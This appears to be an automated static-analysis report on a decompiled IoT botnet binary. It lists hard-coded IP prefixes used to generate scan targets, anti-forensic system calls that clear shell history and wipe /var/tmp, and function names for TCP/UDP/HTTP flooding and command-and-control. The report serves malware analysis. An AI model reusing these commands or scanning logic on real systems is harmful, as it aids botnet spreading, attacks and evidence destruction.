        szprintf((int32_t)&v99, (int32_t)"91.83.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"41.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.173.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.190.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"146.88.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"112.196.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.178.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"112.45.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"183.223.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"116.71.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.44.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"110.235.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"124.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"211.237.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.175.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.173.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"178.93.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"111.9.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"222.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.174.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"222.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.160.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.161.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.162.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.163.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.164.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.165.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.166.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.167.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.168.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.169.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.17.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.18.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.19.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.20.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.21.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"123.22.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"222.252.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"222.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"222.254.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"222.255.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"37.247.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"41.208.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"183.220.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"175.201.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.198.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"183.223.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"50.205.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"88.248.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"88.105.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"88.247.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"85.105.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"188.3.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.203.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.55.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.220.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"183.233.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.242.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.198.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.14.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.195.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.203.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.214.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.218.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.225.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.228.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.231.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.60.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.248.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.253.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.255.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.35.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.49.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"103.62.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"144.48.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"163.47.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"163.53.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"223.29.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"59.153.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.175.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.177.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"113.183.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"202.164.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"203.134.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"210.56.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"49.156.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"203.210.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.181.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.178.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.177.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.176.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.170.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"117.171.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf(v101, (int32_t)"117.162.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf(v101, (int32_t)"112.26.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"112.27.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"112.28.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"112.29.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"112.30.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf((int32_t)&v99, (int32_t)"112.31.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

        szprintf(v102, (int32_t)"203.150.%d.%d", (int32_t)v94, (int32_t)v95, (int32_t)&v100);

    inet_addr((int32_t)"8.8.8.8");

                    int32_t v104 = 0x41a7 * (v98 % (int32_t)"1.%d.%d") - 2836 * v98 / (int32_t)"1.%d.%d"; // 0x17660

================================================================================
========	SYSTEM CALLS SUMMARY : ================================================
================================================================================
            __libc_system(v96);

            __libc_system(v96);

    __libc_system((int32_t)"history -c;history -w");

    __libc_system((int32_t)"cd /root;rm -rf .bash_history");

    return __libc_system((int32_t)"cd /var/tmp; rm -f *");

int32_t __libc_system(int32_t a1) {

================================================================================
========	FUNCTIONS LIST : =======================================================
================================================================================
FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
----------------------------------------------------------------------------------------------
processCmd                                        |2   |4772    |499           |643         |
----------------------------------------------------------------------------------------------
GetRandomPublicIP                                 |4   |1349    |214           |0           |
----------------------------------------------------------------------------------------------
main                                              |0   |710     |85            |495         |
----------------------------------------------------------------------------------------------
__dns_lookup                                      |4   |748     |52            |588         |
----------------------------------------------------------------------------------------------
fdpopen                                           |2   |404     |38            |0           |
----------------------------------------------------------------------------------------------
_fpmaxtostr                                       |6   |3819    |35            |3428        |
----------------------------------------------------------------------------------------------
__uClibc_main                                     |7   |1512    |34            |775         |
----------------------------------------------------------------------------------------------
sendTCP                                           |7   |351     |33            |128         |
----------------------------------------------------------------------------------------------
prints                                            |5   |523     |30            |36          |
----------------------------------------------------------------------------------------------
_stdio_fopen                                      |0   |964     |28            |0           |
----------------------------------------------------------------------------------------------
StartTheLelz                                      |2   |683     |28            |540         |
----------------------------------------------------------------------------------------------
sendUDP                                           |8   |300     |26            |93          |
----------------------------------------------------------------------------------------------
_ppfs_parsespec                                   |1   |1033    |23            |907         |
----------------------------------------------------------------------------------------------
malloc                                            |1   |2831    |21            |1436        |
----------------------------------------------------------------------------------------------
gethostbyname_r                                   |0   |433     |19            |0           |
----------------------------------------------------------------------------------------------
_init                                             |0   |277     |19            |0           |
----------------------------------------------------------------------------------------------
_memcpy                                           |2   |1827    |18            |732         |
----------------------------------------------------------------------------------------------
getOurIP                                          |0   |240     |17            |103         |
----------------------------------------------------------------------------------------------
__open_nameservers                                |0   |393     |17            |127         |
----------------------------------------------------------------------------------------------
gethostbyname2_r                                  |7   |364     |15            |79          |
----------------------------------------------------------------------------------------------
__read_etc_hosts_r                                |0   |240     |11            |105         |
----------------------------------------------------------------------------------------------
print                                             |3   |385     |11            |266         |
----------------------------------------------------------------------------------------------
__GI_inet_ntop                                    |4   |449     |9             |324         |
----------------------------------------------------------------------------------------------
getBogos                                          |2   |165     |9             |64          |
----------------------------------------------------------------------------------------------
__GI_config_read                                  |4   |462     |8             |349         |
----------------------------------------------------------------------------------------------
printi                                            |7   |210     |8             |18          |
----------------------------------------------------------------------------------------------
inet_pton                                         |3   |407     |7             |230         |
----------------------------------------------------------------------------------------------
sendHTTP                                          |6   |154     |7             |40          |
----------------------------------------------------------------------------------------------
negotiate                                         |5   |172     |7             |0           |
----------------------------------------------------------------------------------------------
sendSTD                                           |4   |136     |7             |23          |
----------------------------------------------------------------------------------------------
nprocessors_onln                                  |0   |168     |6             |46          |
----------------------------------------------------------------------------------------------
recvLine                                          |4   |217     |6             |84          |
----------------------------------------------------------------------------------------------
sendHTTP2                                         |6   |153     |6             |42          |
----------------------------------------------------------------------------------------------
memrchr                                           |4   |247     |6             |128         |
----------------------------------------------------------------------------------------------
__GI_memchr                                       |4   |274     |6             |144         |
----------------------------------------------------------------------------------------------
realloc                                           |2   |389     |6             |0           |
----------------------------------------------------------------------------------------------
fdpclose                                          |1   |155     |6             |26          |
----------------------------------------------------------------------------------------------
getCores                                          |1   |122     |6             |19          |
----------------------------------------------------------------------------------------------
fflush_unlocked                                   |3   |230     |5             |52          |
----------------------------------------------------------------------------------------------
_vfprintf_internal                                |11  |892     |5             |766         |
----------------------------------------------------------------------------------------------
getcwd                                            |2   |292     |4             |0           |
----------------------------------------------------------------------------------------------
srandom_r                                         |2   |177     |4             |45          |
----------------------------------------------------------------------------------------------
__udivsi3                                         |2   |451     |4             |212         |
----------------------------------------------------------------------------------------------
sendCNC                                           |4   |113     |4             |0           |
----------------------------------------------------------------------------------------------
socket_connect                                    |2   |133     |4             |0           |
----------------------------------------------------------------------------------------------
__aeabi_idiv                                      |2   |510     |4             |228         |
----------------------------------------------------------------------------------------------
readUntil                                         |8   |191     |4             |80          |
----------------------------------------------------------------------------------------------
strstr                                            |2   |251     |4             |136         |
----------------------------------------------------------------------------------------------
strncpy                                           |3   |201     |4             |88          |
----------------------------------------------------------------------------------------------
__GI_wcsnrtombs                                   |5   |274     |3             |67          |
----------------------------------------------------------------------------------------------
botkiller                                         |1   |118     |3             |18          |
----------------------------------------------------------------------------------------------
__GI_strchrnul                                    |4   |192     |3             |71          |
----------------------------------------------------------------------------------------------
ClearHistory                                      |0   |100     |3             |0           |
----------------------------------------------------------------------------------------------
__GI_strchr                                       |2   |220     |3             |100         |
----------------------------------------------------------------------------------------------
initConnection                                    |0   |131     |3             |0           |
----------------------------------------------------------------------------------------------
_ppfs_setargs                                     |0   |266     |3             |109         |
----------------------------------------------------------------------------------------------
listFork                                          |0   |129     |3             |20          |
----------------------------------------------------------------------------------------------
connectTimeout                                    |4   |159     |3             |0           |
----------------------------------------------------------------------------------------------
_stdio_term                                       |2   |175     |3             |57          |
----------------------------------------------------------------------------------------------
trim                                              |1   |158     |3             |39          |
----------------------------------------------------------------------------------------------
__GI_initstate_r                                  |4   |179     |3             |0           |
----------------------------------------------------------------------------------------------
_stdlib_strto_l                                   |0   |448     |3             |348         |
----------------------------------------------------------------------------------------------
strnlen                                           |2   |262     |3             |93          |
----------------------------------------------------------------------------------------------
sockprintf                                        |2   |106     |3             |0           |
----------------------------------------------------------------------------------------------
strcasestr                                        |3   |146     |2             |46          |
----------------------------------------------------------------------------------------------
contains_string                                   |2   |124     |2             |15          |
----------------------------------------------------------------------------------------------
__GI_closedir                                     |1   |128     |2             |0           |
----------------------------------------------------------------------------------------------
matchPrompt                                       |1   |167     |2             |62          |
----------------------------------------------------------------------------------------------
__GI_strspn                                       |1   |138     |2             |30          |
----------------------------------------------------------------------------------------------
__malloc_consolidate                              |0   |227     |2             |102         |
----------------------------------------------------------------------------------------------
__GI_config_close                                 |1   |113     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fgets_unlocked                               |3   |196     |2             |72          |
----------------------------------------------------------------------------------------------
__stdio_WRITE                                     |3   |178     |2             |75          |
----------------------------------------------------------------------------------------------
__close_nameservers                               |0   |113     |2             |0           |
----------------------------------------------------------------------------------------------
readdir64                                         |1   |144     |2             |36          |
----------------------------------------------------------------------------------------------
rawmemchr                                         |2   |193     |2             |25          |
----------------------------------------------------------------------------------------------
abort                                             |0   |152     |2             |4           |
----------------------------------------------------------------------------------------------
__GI_strpbrk                                      |2   |125     |2             |26          |
----------------------------------------------------------------------------------------------
__libc_system                                     |1   |142     |2             |0           |
----------------------------------------------------------------------------------------------
_uintmaxtostr                                     |1   |221     |2             |54          |
----------------------------------------------------------------------------------------------
inet_aton                                         |2   |198     |2             |90          |
----------------------------------------------------------------------------------------------
__aeabi_ddiv                                      |4   |627     |2             |217         |
----------------------------------------------------------------------------------------------
__GI_fclose                                       |1   |162     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_fgetc                                        |1   |142     |2             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |2   |224     |2             |74          |
----------------------------------------------------------------------------------------------
__open_etc_hosts                                  |0   |98      |1             |0           |
----------------------------------------------------------------------------------------------
__GI_time                                         |1   |107     |1             |0           |
----------------------------------------------------------------------------------------------
inet_addr                                         |1   |101     |1             |0           |
----------------------------------------------------------------------------------------------
zprintf                                           |1   |98      |1             |0           |
----------------------------------------------------------------------------------------------
random                                            |0   |107     |1             |0           |
----------------------------------------------------------------------------------------------
__check_one_fd                                    |2   |107     |1             |0           |
----------------------------------------------------------------------------------------------
GetRandomIP                                       |1   |99      |1             |0           |
----------------------------------------------------------------------------------------------
srand                                             |1   |106     |1             |0           |
----------------------------------------------------------------------------------------------
sclose                                            |1   |105     |1             |0           |
----------------------------------------------------------------------------------------------
strcspn                                           |0   |128     |1             |20          |
----------------------------------------------------------------------------------------------
__GI_gethostbyname                                |1   |98      |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa_r                                  |0   |122     |1             |18          |
----------------------------------------------------------------------------------------------
__GI___uClibc_fini                                |0   |126     |1             |27          |
----------------------------------------------------------------------------------------------
__libc_waitpid                                    |3   |100     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_vsnprintf                                    |0   |134     |1             |0           |
----------------------------------------------------------------------------------------------
_ppfs_init                                        |1   |158     |1             |36          |
----------------------------------------------------------------------------------------------
__GI_raise                                        |1   |98      |1             |0           |
----------------------------------------------------------------------------------------------
__GI__exit                                        |1   |109     |1             |10          |
----------------------------------------------------------------------------------------------
fdgets                                            |4   |123     |1             |21          |
----------------------------------------------------------------------------------------------
getBuild                                          |0   |98      |1             |0           |
----------------------------------------------------------------------------------------------
__getdents64                                      |4   |161     |1             |41          |
----------------------------------------------------------------------------------------------
advance_state                                     |2   |105     |1             |0           |
----------------------------------------------------------------------------------------------
fd_to_DIR                                         |2   |127     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_config_open                                  |1   |112     |1             |0           |
----------------------------------------------------------------------------------------------
inet_ntop4                                        |3   |148     |1             |45          |
----------------------------------------------------------------------------------------------
__GI_fopen                                        |2   |98      |1             |0           |
----------------------------------------------------------------------------------------------
getdtablesize                                     |0   |99      |1             |0           |
----------------------------------------------------------------------------------------------
skip_and_NUL_space                                |1   |138     |1             |33          |
----------------------------------------------------------------------------------------------
__GI_strcasecmp                                   |2   |136     |1             |33          |
----------------------------------------------------------------------------------------------
get_telstate_host                                 |3   |99      |1             |0           |
----------------------------------------------------------------------------------------------
getHost                                           |2   |99      |1             |0           |
----------------------------------------------------------------------------------------------
__xpg_strerror_r                                  |0   |232     |1             |73          |
----------------------------------------------------------------------------------------------
rand                                              |0   |98      |1             |0           |
----------------------------------------------------------------------------------------------
makeIPPacket                                      |4   |99      |1             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostbyname2                               |0   |103     |1             |0           |
----------------------------------------------------------------------------------------------
__GI_inet_ntoa                                    |1   |104     |1             |0           |
----------------------------------------------------------------------------------------------
inet_pton4                                        |2   |169     |1             |46          |
----------------------------------------------------------------------------------------------
_promoted_size                                    |0   |122     |1             |17          |
----------------------------------------------------------------------------------------------
fgets                                             |3   |126     |1             |0           |
----------------------------------------------------------------------------------------------
_charpad                                          |3   |123     |1             |17          |
----------------------------------------------------------------------------------------------
__decode_dotted                                   |5   |212     |1             |78          |
----------------------------------------------------------------------------------------------
__GI_strcoll                                      |2   |122     |1             |19          |
----------------------------------------------------------------------------------------------
__encode_dotted                                   |1   |213     |1             |69          |
----------------------------------------------------------------------------------------------
parseHex                                          |2   |124     |1             |17          |
----------------------------------------------------------------------------------------------
makeRandomStr                                     |2   |109     |1             |0           |
----------------------------------------------------------------------------------------------
isatty                                            |1   |107     |1             |0           |
----------------------------------------------------------------------------------------------
tcpcsum                                           |2   |104     |1             |0           |
----------------------------------------------------------------------------------------------
szprintf                                          |5   |97      |1             |0           |
----------------------------------------------------------------------------------------------
__get_hosts_byname_r                              |7   |98      |1             |0           |
----------------------------------------------------------------------------------------------
sprintf                                           |7   |98      |1             |0           |
----------------------------------------------------------------------------------------------
_stdio_openlist_dec_use                           |0   |176     |1             |40          |
----------------------------------------------------------------------------------------------
read_with_timeout                                 |4   |120     |1             |0           |
----------------------------------------------------------------------------------------------
__malloc_trim                                     |2   |125     |0             |0           |
----------------------------------------------------------------------------------------------
__xstat_conv                                      |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
wait4                                             |2   |108     |0             |0           |
----------------------------------------------------------------------------------------------
__cmpdf2                                          |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
function_17028                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
function_14f90                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fork                                       |0   |109     |0             |0           |
----------------------------------------------------------------------------------------------
csum                                              |2   |151     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_clock_getres                                 |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
fstat                                             |0   |116     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sigaddset                                    |2   |111     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r2                                      |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
isspace                                           |1   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__GI___uClibc_init                                |1   |121     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_init_mutex                                |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
mmap                                              |6   |120     |0             |0           |
----------------------------------------------------------------------------------------------
getsockopt                                        |5   |108     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r6                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_ip                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_select                                     |5   |108     |0             |0           |
----------------------------------------------------------------------------------------------
function_139b0                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_htons                                        |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
sysconf                                           |4   |105     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_fwrite                                    |3   |178     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_unwind_cpp_pr0                            |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
function_1dee4                                    |0   |118     |0             |0           |
----------------------------------------------------------------------------------------------
contains_response                                 |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_read                                         |1   |107     |0             |0           |
----------------------------------------------------------------------------------------------
function_167d4                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs                                        |2   |128     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_connect                                    |3   |108     |0             |0           |
----------------------------------------------------------------------------------------------
__fixunsdfsi                                      |2   |123     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_drsub                                     |3   |98      |0             |0           |
----------------------------------------------------------------------------------------------
function_1724c                                    |1   |105     |0             |0           |
----------------------------------------------------------------------------------------------
munmap                                            |4   |107     |0             |0           |
----------------------------------------------------------------------------------------------
function_1b2c4                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
function_1dd5c                                    |9   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___sigismember                                |2   |99      |0             |0           |
----------------------------------------------------------------------------------------------
rand_cmwc                                         |0   |102     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_pipe                                         |1   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__default_sa_restorer                             |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_random_r                                     |2   |123     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpeq                                    |5   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_adjust_position                           |2   |328     |0             |0           |
----------------------------------------------------------------------------------------------
__malloc_largebin_index                           |1   |112     |0             |0           |
----------------------------------------------------------------------------------------------
getuid                                            |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
getgid                                            |1   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__libc_send                                       |4   |108     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r5                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r4                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmple                                    |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dmul                                      |4   |433     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_gethostname                                  |2   |121     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |105     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
function_14c0c                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |4   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ul2d                                      |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |103     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |1   |108     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |3   |107     |0             |0           |
----------------------------------------------------------------------------------------------
fdopendir                                         |1   |138     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r3                                      |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |0   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmplt                                    |4   |100     |0             |0           |
----------------------------------------------------------------------------------------------
bsd_signal                                        |2   |142     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |3   |114     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_opendir                                      |1   |137     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
function_13424                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_fp                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
reset_telstate                                    |3   |98      |0             |0           |
----------------------------------------------------------------------------------------------
